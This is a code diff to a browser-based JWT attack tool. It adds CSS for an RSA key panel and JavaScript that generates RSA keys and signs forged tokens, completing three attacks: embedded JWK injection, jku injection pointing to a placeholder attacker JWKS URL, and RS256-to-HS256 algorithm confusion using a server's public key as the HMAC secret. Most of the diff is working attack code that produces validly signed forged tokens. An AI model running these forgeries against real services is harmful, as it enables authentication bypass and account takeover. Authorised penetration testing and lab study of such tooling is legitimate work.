@@ -1232,6 +1232,126 @@
             font-size: 0.65rem;
             color: var(--text-muted);
         }
+
+        /* RSA Key Panel */
+        .rsa-panel {
+            grid-column: 1 / -1;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px dashed rgba(255, 255, 255, 0.1);
+            border-radius: var(--radius-sm);
+            padding: 1.5rem;
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .rsa-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .rsa-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .status-badge {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4b5563;
+        }
+
+        .status-badge.active {
+            background: var(--accent-green);
+            box-shadow: 0 0 10px var(--accent-green-glow);
+        }
+
+        .jwk-preview {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--accent-primary);
+            overflow-x: auto;
+            white-space: pre-wrap;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            max-height: 150px;
+            overflow-y: auto;
+        }
+
+        .rsa-btn {
+            background: linear-gradient(135deg, var(--accent-primary), #4f46e5);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .rsa-btn:hover {
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
+        }
+
+        /* Toggle Button System */
+        .toggle-container {
+            display: flex;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 4px;
+            margin-top: 8px;
+        }
+
+        .toggle-option {
+            flex: 1;
+            padding: 6px 12px;
+            font-size: 0.7rem;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.2s;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .toggle-option.active {
+            background: var(--accent-primary);
+            color: white;
+            box-shadow: 0 2px 8px rgba(99, 102, 241, 0.3);
+        }
+
+        .copy-jwks-btn {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--accent-green);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 10px;
+        }
+
+        .copy-jwks-btn:hover {
+            background: rgba(16, 185, 129, 0.2);
+            border-color: var(--accent-green);
+        }
     </style>
 </head>
 
@@ -1460,6 +1580,7 @@
                 algo: 'RS256 → Self-signed JWK',
                 desc: 'Generate an RSA key pair, embed the public key as JWK in the header, and sign with the private key. Server uses embedded key to verify.',
                 fields: [
+                    { id: 'rsa_keys', label: 'RSA Key Management', type: 'rsa_key_ui' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
                     { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
                 ],
@@ -1481,6 +1602,7 @@
                 algo: 'RS256 → External JWKS',
                 desc: 'Point the jku header to an attacker-controlled JWKS URL. Server fetches your public key and verifies your forged token.',
                 fields: [
+                    { id: 'rsa_keys', label: 'RSA Key Management', type: 'rsa_key_ui' },
                     { id: 'jku_url', label: 'Attacker JWKS URL', type: 'text', value: 'https://exploit-server.net/.well-known/jwks.json', hint: 'URL where your JWKS is hosted' },
                     { id: 'kid_value', label: 'Key ID (kid)', type: 'text', value: 'attacker-key', hint: 'Must match the kid in your hosted JWKS' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
@@ -1535,7 +1657,8 @@
                 algo: 'RS256 → HS256',
                 desc: 'Change algorithm from RS256 to HS256 and sign using the server\'s public key as the HMAC secret. Server misinterprets the key.',
                 fields: [
-                    { id: 'public_key', label: 'Server Public Key (PEM or Base64)', type: 'textarea', value: '', hint: 'Get from /jwks.json' },
+                    { id: 'public_key', label: 'Server Public Key (PEM)', type: 'textarea', value: '', hint: '-----BEGIN PUBLIC KEY----- ...' },
+                    { id: 'alg_config', label: 'Attack Configuration', type: 'alg_confusion_tool' },
                     { id: 'payload_claims', label: 'Payload Claims', type: 'claims_builder' },
                     { id: 'custom_claims', label: 'Raw Overrides (JSON)', type: 'textarea', value: '', hint: 'Optional extra claims' }
                 ],
@@ -1664,6 +1787,33 @@
                                     <span id="bruteCountText">0/0</span>
                                 </div>
                             </div>
+                        </div>
+                    `;
+                } else if (f.type === 'rsa_key_ui') {
+                    fieldsHTML += `
+                        <div class="rsa-panel" id="rsaPanel">
+                            <div class="rsa-header">
+                                <div class="rsa-status">
+                                    <div class="status-badge" id="rsaStatusBadge"></div>
+                                    <span id="rsaStatusText">No RSA Key Generated</span>
+                                </div>
+                                <button class="rsa-btn" id="rsaGenBtn" onclick="generateRSAKeyPair()">🔑 Generate 2048-bit RSA Key</button>
+                            </div>
+                            <div class="jwk-preview" id="jwkPreview" style="display:none">
+                                <!-- JWK JSON will be shown here -->
+                            </div>
+                            <button class="copy-jwks-btn" id="copyJwksBtn" onclick="copyJWKS()" style="display:none">📋 Copy JWKS JSON to Clipboard</button>
+                        </div>
+                    `;
+                } else if (f.type === 'alg_confusion_tool') {
+                    fieldsHTML += `
+                        <div class="config-field full-width">
+                            <label>HMAC Secret Format</label>
+                            <div class="toggle-container" id="algConfusionToggle" data-value="der">
+                                <div class="toggle-option active" onclick="setAlgConfusionMode('der', this)">DER Bytes (Best)</div>
+                                <div class="toggle-option" onclick="setAlgConfusionMode('pem', this)">PEM String</div>
+                            </div>
+                            <div class="field-hint" style="margin-top:8px">Servers usually use the raw bytes of the public key as the secret.</div>
                         </div>
                     `;
                 } else if (f.type === 'select') {
@@ -1933,6 +2083,120 @@
             document.getElementById('bruteProgressBar').style.background = 'var(--accent-green)';
         }
 
+        // ========== RSA KEY MANAGEMENT (JWK Injection) ==========
+        let currentRSAKey = null; // Stores {publicKey, privateKey, jwk}
+
+        async function generateRSAKeyPair() {
+            const btn = document.getElementById('rsaGenBtn');
+            const statusBadge = document.getElementById('rsaStatusBadge');
+            const statusText = document.getElementById('rsaStatusText');
+            const preview = document.getElementById('jwkPreview');
+
+            btn.disabled = true;
+            btn.textContent = '⏳ Generating Key...';
+            statusText.textContent = 'Generating 2048-bit RSA...';
+
+            try {
+                const keyPair = await window.crypto.subtle.generateKey(
+                    {
+                        name: "RSASSA-PKCS1-v1_5",
+                        modulusLength: 2048,
+                        publicExponent: new Uint8Array([1, 0, 1]),
+                        hash: "SHA-256"
+                    },
+                    true,
+                    ["sign", "verify"]
+                );
+
+                const jwk = await window.crypto.subtle.exportKey("jwk", keyPair.publicKey);
+                
+                currentRSAKey = {
+                    publicKey: keyPair.publicKey,
+                    privateKey: keyPair.privateKey,
+                    jwk: jwk
+                };
+
+                // UI Update
+                statusBadge.classList.add('active');
+                statusText.textContent = 'RSA Key Active (2048-bit)';
+                btn.textContent = '🔄 Regenerate RSA Key';
+                btn.disabled = false;
+
+                preview.style.display = 'block';
+                preview.textContent = JSON.stringify(jwk, null, 2);
+                
+                const copyBtn = document.getElementById('copyJwksBtn');
+                if (copyBtn) copyBtn.style.display = 'block';
+                
+                showToast('🔑 RSA Key Pair generated successfully!');
+                updateGenerator(); // Trigger update if needed
+            } catch (err) {
+                console.error(err);
+                showToast('❌ Error generating RSA key. Check browser support.', true);
+                btn.disabled = false;
+                btn.textContent = '🔑 Generate 2048-bit RSA Key';
+            }
+        }
+
+        async function rs256Sign(data, privateKey) {
+            const encoder = new TextEncoder();
+            const encodedData = encoder.encode(data);
+            const signature = await window.crypto.subtle.sign(
+                { name: "RSASSA-PKCS1-v1_5" },
+                privateKey,
+                encodedData
+            );
+            return base64UrlEncodeFromBuffer(signature);
+        }
+
+        function base64UrlEncodeFromBuffer(buffer) {
+            const bytes = new Uint8Array(buffer);
+            let binary = '';
+            for (let i = 0; i < bytes.byteLength; i++) {
+                binary += String.fromCharCode(bytes[i]);
+            }
+            return btoa(binary)
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_')
+                .replace(/=/g, '');
+        }
+
+        function copyJWKS() {
+            if (!currentRSAKey) return;
+            const jwks = {
+                keys: [currentRSAKey.jwk]
+            };
+            navigator.clipboard.writeText(JSON.stringify(jwks, null, 2));
+            showToast('📋 JWKS JSON copied to clipboard!');
+        }
+
+        function setAlgConfusionMode(mode, el) {
+            const container = document.getElementById('algConfusionToggle');
+            container.setAttribute('data-value', mode);
+            container.querySelectorAll('.toggle-option').forEach(opt => opt.classList.remove('active'));
+            el.classList.add('active');
+            updateGenerator();
+        }
+
+        function pemToDER(pem) {
+            // Remove headers, footers, and whitespace
+            const base64 = pem
+                .replace(/-----BEGIN PUBLIC KEY-----/, '')
+                .replace(/-----END PUBLIC KEY-----/, '')
+                .replace(/\s/g, '');
+            
+            try {
+                const binStr = atob(base64);
+                const bytes = new Uint8Array(binStr.length);
+                for (let i = 0; i < binStr.length; i++) {
+                    bytes[i] = binStr.charCodeAt(i);
+                }
+                return bytes.buffer;
+            } catch (e) {
+                return null;
+            }
+        }
+
         // ========== GENERATE PAYLOAD ==========
         async function generatePayload() {
             const token = document.getElementById('jwtInput').value.trim();
@@ -2043,38 +2307,54 @@
                 }
 
                 case 'jwk_injection': {
-                    applyPayloadChanges();
-                    // Generate a note about using Burp Suite
-                    const headerB64 = base64UrlEncode(JSON.stringify({
-                        ...modifiedHeader,
-                        alg: 'RS256',
-                        jwk: {
-                            kty: 'RSA',
-                            e: 'AQAB',
-                            kid: modifiedHeader.kid || 'generated-key',
-                            n: '<YOUR_RSA_PUBLIC_KEY_MODULUS>'
-                        }
-                    }));
-                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
-                    resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_YOUR_RSA_PRIVATE_KEY>`;
-                    notes.push('⚠️ This attack requires Burp Suite JWT Editor to generate RSA keys and sign');
-                    notes.push('Use "Attack → Embedded JWK" in Burp Repeater after generating RSA key');
+                    if (!currentRSAKey) {
+                        notes.push('⚠️ No RSA Key generated! Click "Generate RSA Key" to sign the token.');
+                        applyPayloadChanges();
+                        modifiedHeader.alg = 'RS256';
+                        const h = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const p = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        resultToken = `${h}.${p}.[SIGNATURE_MISSING]`;
+                    } else {
+                        applyPayloadChanges();
+                        modifiedHeader.alg = 'RS256';
+                        modifiedHeader.jwk = currentRSAKey.jwk;
+                        // Use existing kid if present, or generate/reuse
+                        if (!modifiedHeader.kid) modifiedHeader.kid = 'jwt-attack-forge-key';
+                        
+                        const h = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const p = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        const signature = await rs256Sign(`${h}.${p}`, currentRSAKey.privateKey);
+                        resultToken = `${h}.${p}.${signature}`;
+                        notes.push('✅ Token signed with ephemeral RSA key and JWK injected');
+                    }
                     break;
                 }
 
                 case 'jku_injection': {
                     const jkuUrl = getVal('jku_url');
                     const kidVal = getVal('kid_value');
-                    applyPayloadChanges();
-                    modifiedHeader.alg = 'RS256';
-                    modifiedHeader.jku = jkuUrl;
-                    modifiedHeader.kid = kidVal;
-                    const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
-                    const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
-                    resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_YOUR_RSA_PRIVATE_KEY>`;
-                    notes.push('⚠️ You must host a JWKS file at the jku URL with matching kid');
-                    notes.push('Sign the token with the private key matching the hosted public key');
-                    notes.push(`JWKS URL: ${jkuUrl}`);
+                    
+                    if (!currentRSAKey) {
+                        notes.push('⚠️ No RSA Key generated! Click "Generate RSA Key" and host the JWKS at the JKU URL.');
+                        applyPayloadChanges();
+                        modifiedHeader.alg = 'RS256';
+                        modifiedHeader.jku = jkuUrl;
+                        modifiedHeader.kid = kidVal;
+                        const h = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const p = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        resultToken = `${h}.${p}.[SIGNATURE_MISSING]`;
+                    } else {
+                        applyPayloadChanges();
+                        modifiedHeader.alg = 'RS256';
+                        modifiedHeader.jku = jkuUrl;
+                        modifiedHeader.kid = kidVal;
+                        
+                        const h = base64UrlEncode(JSON.stringify(modifiedHeader));
+                        const p = base64UrlEncode(JSON.stringify(modifiedPayload));
+                        const signature = await rs256Sign(`${h}.${p}`, currentRSAKey.privateKey);
+                        resultToken = `${h}.${p}.${signature}`;
+                        notes.push(`✅ Token signed with RSA key. Ensure JWKS is hosted at: ${jkuUrl}`);
+                    }
                     break;
                 }
 
@@ -2096,27 +2376,34 @@
                 }
 
                 case 'alg_confusion': {
-                    const publicKey = getVal('public_key');
-                    applyPayloadChanges();
-                    modifiedHeader.alg = 'HS256';
-                    delete modifiedHeader.kid;
-
-                    if (publicKey.trim()) {
-                        const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
-                        const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
-                        const sigInput = `${headerB64}.${payloadB64}`;
-                        // For algorithm confusion, sign with the public key as HMAC secret
-                        const signature = await hmacSha256Sign(sigInput, publicKey.trim());
-                        resultToken = `${headerB64}.${payloadB64}.${signature}`;
-                        notes.push('Algorithm changed from RS256 → HS256');
-                        notes.push('Signed using server public key as HMAC secret');
-                    } else {
-                        const headerB64 = base64UrlEncode(JSON.stringify(modifiedHeader));
-                        const payloadB64 = base64UrlEncode(JSON.stringify(modifiedPayload));
-                        resultToken = `${headerB64}.${payloadB64}.<SIGN_WITH_PUBLIC_KEY_AS_HS256_SECRET>`;
-                        notes.push('⚠️ Paste the server public key to generate a signed token');
-                        notes.push('Use Burp JWT Editor: New Symmetric Key → Base64-encode PEM → set as "k"');
+                    const pem = getVal('public_key');
+                    if (!pem) {
+                        showToast('⚠️ Please provide the server\'s public key (PEM)', true);
+                        return;
                     }
+
+                    const format = document.getElementById('algConfusionToggle').getAttribute('data-value');
+                    let secret;
+                    
+                    if (format === 'der') {
+                        secret = pemToDER(pem); // Uint8Array buffer
+                        if (!secret) {
+                            showToast('❌ Invalid PEM format. Could not extract DER bytes.', true);
+                            return;
+                        }
+                    } else {
+                        secret = pem.trim(); // Raw string
+                    }
+
+                    modifiedHeader.alg = 'HS256';
+                    applyPayloadChanges();
+                    const h = base64UrlEncode(JSON.stringify(modifiedHeader));
+                    const p = base64UrlEncode(JSON.stringify(modifiedPayload));
+                    const sigInput = `${h}.${p}`;
+                    
+                    const signature = await hmacSha256Sign(sigInput, secret);
+                    resultToken = `${h}.${p}.${signature}`;
+                    notes.push(`✅ Algorithm confusion applied. Signed with HS256 using ${format.toUpperCase()} secret.`);
                     break;
                 }
 
